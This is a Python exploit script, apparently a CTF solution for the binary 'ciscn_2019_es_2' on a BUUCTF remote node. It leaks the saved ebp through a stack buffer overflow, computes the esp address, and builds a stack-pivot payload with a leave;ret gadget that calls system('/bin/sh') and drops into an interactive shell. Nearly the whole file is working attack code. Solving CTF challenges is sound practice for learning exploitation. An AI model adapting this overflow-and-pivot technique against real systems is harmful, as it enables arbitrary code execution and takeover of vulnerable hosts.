import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=False,
    file='./ciscn_2019_es_2',
    remote='node4.buuoj.cn:25906',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    autu_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

pause()
payload = b'a' * 35 + b'b' * 5
# buf has 0x28 length , we use 0x28 chars to fill
# then \0 will not exist , so we get `esp`

se(payload)
ru(b'b' * 5)
ebp_addr = u00(rc(4))
esp_addr = ebp_addr - 0x38  # debug here and get esp - ebp = 0x38
log.info(f'esp_addr:{hex(esp_addr)}')

bin_sh_addr = esp_addr + 0x10  # following payload has 4 items (16 bytes)
rop_leave = 0x080485FD
payload = fakeebp() + p00(elf.plt['system']) + fakeebp()
payload += p00(bin_sh_addr) + b'/bin/sh'
payload = payload.ljust(40, b'\0')
payload += p00(esp_addr) + p00(rop_leave)
sa(b'\n', payload)
interactive()
